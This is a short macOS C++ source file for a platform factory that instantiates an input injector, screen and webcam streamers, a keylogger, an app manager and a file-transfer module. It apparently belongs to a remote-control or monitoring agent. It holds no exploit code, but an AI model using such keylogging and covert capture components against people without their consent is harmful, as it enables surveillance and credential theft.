#ifdef PLATFORM_MACOS

#import "MacOSPlatformFactory.hpp"
#import "MacOSInputInjector.hpp"
#import "MacOSScreenStreamer.hpp"
#import "MacOSWebcamStreamer.hpp"
#import "MacOSKeylogger.hpp"
#import "MacOSAppManager.hpp"
#import "MacOSFileTransfer.hpp"
#include <iostream>

namespace platform {
namespace macos {

// ============================================================================
// Factory Method Implementations
// ============================================================================

std::unique_ptr<interfaces::IInputInjector> MacOSPlatformFactory::create_input_injector() {
    return std::make_unique<MacOSInputInjector>();
}

std::unique_ptr<interfaces::IVideoStreamer> MacOSPlatformFactory::create_screen_streamer() {
    return std::make_unique<MacOSScreenStreamer>();
}

std::unique_ptr<interfaces::IVideoStreamer> MacOSPlatformFactory::create_webcam_streamer() {
    return std::make_unique<MacOSWebcamStreamer>(0);  // Default device index
}

std::unique_ptr<interfaces::IKeylogger> MacOSPlatformFactory::create_keylogger() {
    return std::make_unique<MacOSKeylogger>();
}

std::unique_ptr<interfaces::IAppManager> MacOSPlatformFactory::create_app_manager() {
    return std::make_unique<MacOSAppManager>();
}

std::unique_ptr<interfaces::IFileTransfer> MacOSPlatformFactory::create_file_transfer() {
    return std::make_unique<MacOSFileTransfer>();
}

// ============================================================================
// Lifecycle
// ============================================================================

void MacOSPlatformFactory::initialize() {
    if (initialized_) return;

    std::cout << "[MacOSPlatform] Initializing..." << std::endl;

    // macOS-specific initialization
    // (Currently none required - permissions are checked at runtime)

    initialized_ = true;
    std::cout << "[MacOSPlatform] Ready" << std::endl;
}

void MacOSPlatformFactory::shutdown() {
    if (!initialized_) return;

    std::cout << "[MacOSPlatform] Shutting down..." << std::endl;

    initialized_ = false;
}

} // namespace macos
} // namespace platform

#endif // PLATFORM_MACOS
